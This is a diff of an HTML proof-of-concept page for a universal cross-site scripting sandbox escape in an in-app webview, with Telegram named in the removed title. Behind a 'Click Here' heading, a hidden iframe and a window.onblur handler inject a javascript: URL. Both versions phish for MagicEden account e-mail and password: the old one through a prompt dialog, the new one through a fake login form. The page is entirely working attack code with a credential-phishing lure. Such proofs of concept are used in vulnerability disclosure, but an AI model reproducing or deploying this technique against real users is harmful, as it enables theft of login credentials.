@@ -1,31 +1,25 @@
 <!DOCTYPE html>
 <html lang="en-US">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>Bypass sandbox Webview UXSS Delayed JavaScript execution leak to host app (Telegram)</title>
-
-    <style>
-        iframe {
-            visibility: hidden;
-        }
-    </style>
-
-    <script>
-
-        window.onblur = function () {
-            document.getElementById("iframe").src = "javascript:(function(){prompt('In order to access magiceden.io\\nyou must first login on your\\nMagicEden Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.')})()";
-        };
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>UXSS Sandbox Escape Simulation</title>
+  <style>
+    iframe {
+      visibility: hidden;
+    }
+  </style>
+  <script>
+    window.onblur = function () {
+      document.getElementById("iframe").src = "javascript:(function(){document.body.innerHTML='<div style=\\\"position:fixed;top:30%;left:30%;background:#fff;padding:20px;border:1px solid #ccc;z-index:9999;font-family:sans-serif;\\\"><h3>Login Required</h3><p>Please enter your MagicEden credentials:</p><input type=\\\"text\\\" placeholder=\\\"Email\\\"><br><input type=\\\"password\\\" placeholder=\\\"Password\\\"><br><button onclick=\\\"alert(\\'Submitted\\')\\\">Submit</button></div>';})()";
+    };
+  </script>
 </head>
-
 <body>
-    <center>
-        <br>
-        <h1>Click Here</h1>
-    </center>
-    <iframe id="iframe"></iframe>
+  <center>
+    <br>
+    <h1>Click Here</h1>
+  </center>
+  <iframe id="iframe"></iframe>
 </body>
-
 </html>
